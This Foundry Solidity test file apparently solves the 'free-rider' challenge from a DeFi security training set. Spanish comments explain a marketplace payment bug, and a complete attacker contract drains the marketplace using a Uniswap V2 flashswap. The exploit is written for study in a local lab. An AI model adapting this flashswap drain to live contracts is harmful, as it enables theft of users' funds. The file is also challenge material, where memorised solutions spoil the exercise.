// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

/*
 * NEXUS Offensive · training/dvd · reto "free-rider"
 *
 * CLASE DE BUG: lógica de marketplace invertida. En `_buyOne` el pago se envía
 *   a `ownerOf(tokenId)` DESPUÉS de transferir el NFT, así que se le paga al
 *   COMPRADOR, no al vendedor. Además `msg.value` se reutiliza en todo el lote:
 *   se compran los 6 NFTs pagando una sola vez. Con un flashswap de Uniswap V2
 *   para el capital inicial, se vacía el marketplace y se cobra la recompensa.
 *
 * FAMILIA: Lógica de marketplace / pago (control de flujo de fondos).
 *
 * INVARIANTE QUE LO ATRAPA (nueva, relacionada con FL — flujo de fondos):
 *   Comprar un NFT debe COSTARLE al comprador (el pago va al vendedor), nunca
 *   pagarle. Se sostiene al inicio y se rompe: el comprador obtiene 6 NFTs y
 *   además GANA ETH del marketplace.
 */
contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        token = new DamnValuableToken();
        weth = new WETH();
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), UNISWAP_INITIAL_TOKEN_RESERVE, 0, 0, deployer, block.timestamp * 2
        );
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);
        vm.stopPrank();
    }

    function test_free_rider() public checkSolvedByPlayer {
        FreeRiderAttacker attacker = new FreeRiderAttacker(
            uniswapPair, marketplace, nft, weth, recoveryManager, player
        );
        attacker.attack();

        // INV rota: el comprador obtuvo NFTs y ADEMÁS ganó ETH del marketplace.
        console.log("ganancia del comprador en la compra (wei):", attacker.profitFromBuy());
        assertGt(attacker.profitFromBuy(), 0, "INV rota: el marketplace pago al comprador");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private {
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

/// @notice Atacante: flashswap de WETH → compra los 6 NFTs por el precio de uno
///         → los manda al recovery manager (cobra bounty) → repaga el flashswap.
contract FreeRiderAttacker is IERC721Receiver {
    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public market;
    DamnValuableNFT public nft;
    WETH public weth;
    FreeRiderRecoveryManager public recovery;
    address public player;
    uint256 public profitFromBuy;

    uint256 constant PRICE = 15 ether;
    uint256 constant N = 6;

    constructor(
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _market,
        DamnValuableNFT _nft,
        WETH _weth,
        FreeRiderRecoveryManager _recovery,
        address _player
    ) {
        pair = _pair;
        market = _market;
        nft = _nft;
        weth = _weth;
        recovery = _recovery;
        player = _player;
    }

    function attack() external {
        // Flashswap de PRICE WETH (token0 = weth).
        pair.swap(PRICE, 0, address(this), abi.encode(PRICE));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "bad caller");

        weth.withdraw(PRICE); // WETH -> ETH

        uint256[] memory ids = new uint256[](N);
        for (uint256 i; i < N; i++) {
            ids[i] = i;
        }

        uint256 beforeBuy = address(this).balance;
        market.buyMany{value: PRICE}(ids); // compra los 6 pagando una vez
        profitFromBuy = address(this).balance - beforeBuy; // +75 ETH (el market nos pagó)

        // Enviar los 6 NFTs al recovery manager; el 6º dispara el bounty al player.
        for (uint256 i; i < N; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(player));
        }

        // Repagar el flashswap en WETH (principal + 0.3% fee).
        uint256 repay = (PRICE * 1000) / 997 + 1;
        weth.deposit{value: repay}();
        weth.transfer(address(pair), repay);

        // El resto del botín, al player.
        payable(player).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
